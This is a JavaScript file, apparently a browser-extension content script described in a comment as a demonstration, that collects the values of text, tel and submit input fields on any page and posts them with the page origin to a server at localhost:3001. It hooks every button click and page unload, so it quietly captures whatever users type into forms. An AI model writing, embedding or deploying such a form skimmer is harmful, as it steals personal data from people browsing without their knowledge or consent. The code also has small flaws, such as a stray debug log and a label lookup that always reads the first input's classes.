window.onbeforeunload = function() {
   sendUserData()
}

function addtoev() {
    var bns = document.getElementsByTagName("button");
    for (i = 0; i < bns.length; i++) {
        bns[i].addEventListener("click", sendUserData)
    }
}

window.addEventListener("load",function() {
    addtoev();
});

var sendUserData = function() {
    var inputFields = document.getElementsByTagName('input');
    var textLibrary = {}
    var validType = new Set(['submit', 'tel', 'text'])
    for (var i = 0; i < inputFields.length; i ++) {
        if (validType.has(inputFields[i].type)) {
            textLibrary[findRelevantName(inputFields[i])] = inputFields[i].value
        }
    }
    if (Object.keys(textLibrary).length > 0) {
        textLibrary['url'] = window.location.origin
        var data = {extension_data: JSON.stringify(textLibrary)}
        $.post("http://localhost:3001/users", data, function(data, status){
            console.log(status)
        })
    }
}
console.log('reee')
    var globalNoFind = 0
// This function could be greatly improved, but is left basic as it is only for demonstration purposes
var findRelevantName = function(inputField) {
    // First look for id
    if (inputField.id !== '') {
        return inputField.id
    }
    // Next find text next to it
    var parentElement = inputField.parentElement
    var exceptions = new Set(['confirm', 'submit', 'update', 'done', ''])
    while (parentElement !== null) {
        // create exception if see certain expected names
        if (!exceptions.has(parentElement.innerText.trim().toLowerCase()) && parentElement.innerText.trim().length < 20) {
            return parentElement.innerText.trim().toLowerCase()
        }
        parentElement = parentElement.parentElement
    }
    // Try doing it's class / classes concatenated
    var classList = document.getElementsByTagName('input')[0].classList.value.split(' ').join('_')
    if (classList !== '') {
        return classList
    }
    // Just return a unique key, more ideas can be used such as parent id or classes
    globalNoFind ++
    return 'defaultKey' + globalNoFind
}